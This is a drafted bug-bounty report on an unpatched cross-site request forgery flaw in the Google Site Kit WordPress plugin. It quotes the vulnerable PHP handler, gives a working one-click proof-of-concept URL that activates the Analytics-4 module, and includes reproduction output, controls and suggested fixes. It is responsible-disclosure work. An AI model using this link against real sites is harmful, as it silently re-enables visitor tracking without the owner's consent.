# Wordfence submission 02 — Golinks CSRF to module activation

Field-by-field for the Wordfence Bug Bounty intake form. Paste each block into
the matching field.

---

## Software

    Type              Plugin
    Name              Google Site Kit
    Slug              google-site-kit
    Affected versions 1.174.0 – 1.190.0 (1.174.0 introduced Golinks; 1.190.0 is
                      current at submission)
    Tested on         1.190.0, commit 8cf47de
    Patched version   none — unfixed in the current release

## Title

    Google Site Kit <= 1.190.0 - Cross-Site Request Forgery to Analytics-4
    Module Activation via admin_action_googlesitekit_go

## Vulnerability type

    Cross-Site Request Forgery (CSRF)  (CWE-352)

## Required privileges

    Unauthenticated. The attacker needs a logged-in administrator to follow one
    link.

## CVSS

    3.1  AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N  = 4.3 (Medium)

## Description

The Google Site Kit plugin for WordPress does not verify a nonce on its
`admin_action_googlesitekit_go` handler. One of the golink handlers it
dispatches to is not a redirect — it activates the Analytics-4 module — so an
unauthenticated attacker can activate the module on a site by getting a
logged-in administrator to follow a single link.

`Golinks::handle_go()` dispatches on an unauthenticated `to` parameter with no
nonce check anywhere in the path:

```php
// includes/Core/Golinks/Golinks.php
const ACTION_GO = 'googlesitekit_go';

public function register() {
    add_action( 'admin_action_' . self::ACTION_GO, array( $this, 'handle_go' ) );
}

public function handle_go() {
    $key = sanitize_key( (string) $this->context->input()->filter( INPUT_GET, 'to', FILTER_DEFAULT ) );
    …
    $destination = $this->handlers[ $key ]->handle( $this->context );
    wp_safe_redirect( $destination );
}
```

There is no `check_admin_referer()`, and `Golinks::get_url()` puts no nonce in
the URL it builds. `admin_action_*` fires from `wp-admin/admin.php`, which
every admin page includes.

Three of the four registered handlers are pure redirects. The fourth performs a
state change:

```php
// includes/Core/Email_Reporting/Email_Notice_Golink_Handler.php
if ( Analytics_Setup_Email_Notice::ID === $notice_id
     && user_can( $user, Permissions::MANAGE_OPTIONS ) ) {
    if ( ! $this->modules->is_module_active( Analytics_4::MODULE_SLUG ) ) {
        $this->modules->activate_module( Analytics_4::MODULE_SLUG );
    }
    …
}
$this->email_notices->dismiss_notice_for_user( $notice_id, $user );
```

`Email_Notices::GOLINK_NOTICE` is `'email-report-notice'` and
`Analytics_Setup_Email_Notice::ID` is `'analytics-setup'`.

Where Analytics-4 has been configured with a measurement ID and then switched
off — the state a site is in when an administrator deactivates the module and
keeps its settings — activating it puts the site's Google Analytics tag back
into every public page, and measurement of all visitors resumes. The
administrator sees nothing but a redirect.

The dismissal on the last line runs for **any** logged-in user, including one
with no Site Kit access at all, writing
`email-report-notice-analytics-setup` into that user's dismissed prompts. An
unregistered `notice_id` does nothing: `dismiss_notice_for_user()` resolves it
through `get_notice()` and returns early when that is null.

WordPress sends no `SameSite` attribute on its auth cookies, so browsers treat
them as `Lax`: they are sent on a top-level navigation and not on a
subresource. The attacker's page therefore needs the administrator to follow a
link — an anchor, a redirect, or `window.location` — so this is one click
rather than zero, and an `<img>` tag would not work.

Note for triage: the vendor has accepted this class in this plugin recently —
**CVE-2026-62139**, *Site Kit <= 1.186.0, Cross-Site Request Forgery*. That is
a different function; `Golinks::handle_go()` still has no nonce check in the
current release. In the same period the project added `wp_verify_nonce` to the
Analytics provisioning callback (commit `51603f4dba`, "Harden analytics
provisioning callback"), a commit that does not touch `Core/Golinks/` at all.

## Proof of concept

1. Install WordPress with Google Site Kit 1.190.0 and complete setup.
2. Configure Analytics-4 with a measurement ID, then deactivate the module,
   keeping its settings.
3. Load the site logged out and confirm there is no
   `googletagmanager.com/gtag/js` script.
4. As a logged-in administrator, follow:

       http://<site>/wp-admin/index.php?action=googlesitekit_go&to=email-report-notice&notice_id=analytics-setup

   No nonce, no POST, no form. In a real attack this is an anchor or a
   `window.location` on an attacker-controlled page.
5. Analytics-4 is now active, and a logged-out visitor receives the gtag script
   and a `gtag("config", "G-…")` call.

### Observed output

```
environment
  date (UTC)    : 2026-10-29T17:01:52Z
  WordPress     : 6.9.11    Site Kit: 1.190.0 (commit 8cf47de)    PHP: 8.3.6

starting state: analytics-4 configured (measurement ID G-REPRO) but DEACTIVATED
  googlesitekit_active_modules = ["search-console"]
  analytics-4 measurementID    = G-REPRO

what a visitor is served BEFORE (no cookies):
  gtag script tags: 0

the request — one GET, no nonce, as a logged-in administrator:
  GET /wp-admin/index.php?action=googlesitekit_go&to=email-report-notice&notice_id=analytics-setup
  HTTP/1.1 302 Found
  Location: /wp-admin/index.php?action=googlesitekit_go&to=connect-analytics-4

  googlesitekit_active_modules = ["search-console","analytics-4"]

what a visitor is served AFTER (no cookies):
  <script src="https://www.googletagmanager.com/gtag/js?id=G-REPRO" id="google_gtagjs-js" async>
  gtag("config", "G-REPRO")
```

### Controls — same site

```
contributor follows the same link
  dismissed_prompts BEFORE: (none)
  dismissed_prompts AFTER : a:1:{s:35:"email-report-notice-analytics-setup";…}
  active modules          : ["search-console"]   (unchanged — the MANAGE_OPTIONS check holds)

administrator follows the link again while the module is already active
  active modules          : unchanged; only the notice dismissal runs
```

So the victim must be an administrator for the module activation, and the
notice dismissal reaches any logged-in user.

## Suggested remediation

Golinks are email CTA links by design —
`Notices/Analytics_Setup_Email_Notice.php:161` builds this URL for the email
body — and a WordPress nonce is user- and time-bound, so `wp_create_nonce()` on
an emailed link is not the fix. Two that keep the email flow working:

* a signed, single-use token in the golink URL, verified in `handle_go()`; or
* a confirmation step before the module is activated, so the GET lands on a
  page rather than performing the change.

`Golinks::get_url()` is the single place these URLs are built, so either covers
every golink at once.

For reference, seven of the plugin's eight `admin_action_` handlers already
verify a nonce:

| `admin_action_` handler | verifies a nonce |
|---|---|
| `Setup::handle_action_setup_start` | yes |
| `Setup::handle_action_verify` | yes |
| `Setup::handle_action_exchange_site_code` | yes |
| `Authentication::handle_connect` | yes |
| `Authentication::handle_disconnect` | yes |
| `Sign_In_With_Google::handle_disconnect_user` | yes |
| `Reset::handle_reset_action` | yes |
| **`Golinks::handle_go`** | **no** |

## Scope of the claim

The attacker does not choose which measurement ID is injected — it is the
site's own, and the settings route that would change it requires
`manage_options` and a nonce. They gain no access and read nothing. On a site
where Analytics-4 was never configured, activating it changes nothing a visitor
sees and the request only dismisses a notice. I checked the other three golink
handlers (`Connect_Module_Golink_Handler`, `Settings_Golink_Handler`,
`Dashboard_Golink_Handler`) and all three only build a redirect URL — no state
change — and `email-report-notice` is the only registered notice, so this is
the whole of the reachable impact.

## Test environment

Local WordPress on SQLite (`sqlite-database-integration` v3.1.2), because the
machine has no MySQL. Site Kit's proxy credentials, a Search Console property
and the module owner's token were written directly, because an OAuth flow
cannot be completed offline. None of them is involved in the missing nonce, and
the Contributor control above shows the capability check still does its work.

## Disclosure status

Not publicly disclosed. Not submitted to any other bug bounty platform. This
finding was prepared for Google's OSS VRP and deliberately **not** filed:
Google paused OSS VRP product-vulnerability intake on 2026-10-01, and the twin
report on this plugin (issue 579506120, filed 2026-10-29) was closed on
2026-10-30 as `Won't fix (Infeasible)` for that reason alone, without the
technical question being reached. Nothing about this finding is public.
